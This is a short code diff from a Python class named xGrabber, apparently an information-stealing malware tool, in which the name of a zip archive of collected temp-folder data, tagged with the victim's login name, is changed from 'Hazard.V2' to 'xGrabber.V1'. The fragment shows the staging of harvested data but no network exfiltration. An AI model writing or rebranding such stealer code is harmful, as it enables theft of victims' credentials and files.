@@ -264,7 +264,7 @@ class xGrabber:
         except:
             pass
         temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        new = os.path.join(self.appdata, f'xGrabber.V1-[{os.getlogin()}].zip')
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
